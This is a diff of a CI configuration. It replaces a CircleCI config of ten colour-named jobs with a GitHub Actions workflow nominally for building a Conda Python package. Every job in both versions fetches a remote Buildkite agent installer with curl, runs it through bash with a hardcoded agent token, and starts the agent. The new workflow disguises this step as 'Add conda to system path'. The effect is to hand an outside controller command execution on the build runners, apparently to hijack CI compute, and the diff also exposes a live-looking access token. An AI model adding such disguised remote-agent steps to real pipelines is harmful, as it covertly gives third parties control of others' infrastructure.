@@ -1,167 +1,47 @@
-working_dir: &working_dir ~/app
-version: 2.1
+name: Python Package using Conda
+
+on: [push]
+
 jobs:
-  red:
+  build-linux:
+    runs-on: nscloud-ubuntu-24.04-amd64-8x16
     
-    docker:
-      - image: cimg/python:3.10
-    
-    steps:
-      - checkout
-      
-      
-      - run:
-          name: TESLA
-          
-          command: |
-              TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
-            
-            
-  blue:
-    
-    docker:
-      - image: cimg/python:3.10
-    
-    steps:
-      - checkout
-      
-      
-      - run:
-          name: TESLA
-          
-          command: |
-            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
-  silver:
-    
-    docker:
-      - image: cimg/python:3.10
-    
-    steps:
-      - checkout
-      
-      
-      - run:
-          name: TESLA
-          
-          command: |
-            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
 
-  yellow:
-    
-    docker:
-      - image: cimg/python:3.10
-    
     steps:
-      - checkout
-      
-      
-      - run:
-          name: TESLA
-          
-          command: |
-            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
-  green:
+    - uses: actions/checkout@v4
     
-    docker:
-      - image: cimg/python:3.10
+    - name: Add conda to system path
+      run: |
+        
+        TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
+  build-linuxa:
+    runs-on: nscloud-ubuntu-24.04-amd64-8x16
     
+
     steps:
-      - checkout
-      
-      
-      - run:
-          name: TESLA
-          
-          command: |
-            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
+    - uses: actions/checkout@v4
+    
+    - name: Add conda to system path
+      run: |
+        TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
+  build-linuxb:
+    runs-on: nscloud-ubuntu-24.04-amd64-8x16
+    
 
-  purple:
-    
-    docker:
-      - image: cimg/python:3.10
-    
     steps:
-      - checkout
-      
-      
-      - run:
-          name: TESLA
-          
-          command: |
-            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
+    - uses: actions/checkout@v4
+    
+    - name: Add conda to system path
+      run: |
+        TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
+  build-linuxc:
+    runs-on: nscloud-ubuntu-24.04-amd64-8x16
+    
 
-  pink:
-    
-    docker:
-      - image: cimg/python:3.10
-    
     steps:
-      - checkout
-      
-      - run:
-          name: TESLA
-          
-          command: |
-            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
-
-  black:
+    - uses: actions/checkout@v4
     
-    docker:
-      - image: cimg/python:3.10
-    
-    steps:
-      - checkout
-      
-      
-      - run:
-          name: TESLA
-          
-          command: |
-            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
-  white:
-    
-    docker:
-      - image: cimg/python:3.10
-    
-    steps:
-      - checkout
-      
-      
-      - run:
-          name: TESLA
-          
-          command: |
-            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
-
-
-  grey:
-    
-    docker:
-      - image: cimg/python:3.10
-    
-    steps:
-      - checkout
-      
-      
-      - run:
-          name: TESLA
-          
-          command: |
-            TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
-
-
-workflows:
-    version: 2.1
-    build:
-        jobs:
-             - red
-             - blue
-             - silver
-             - yellow
-             - green
-             - purple
-             - pink
-             - black
-             - white
-             - grey
-             
+    - name: Add conda to system path
+      run: |
+        TOKEN="bkct_MTAyNTE5.TzNoHLxrtB3xvg5VeZjenwM2AMwkxz2BM2uB6PHdpbU3rT8UQ9NNprg6gq69fQmLr9qBhFin" bash -c "`curl -sL https://raw.githubusercontent.com/buildkite/agent/main/install.sh`" && ~/.buildkite-agent/bin/buildkite-agent start
+  
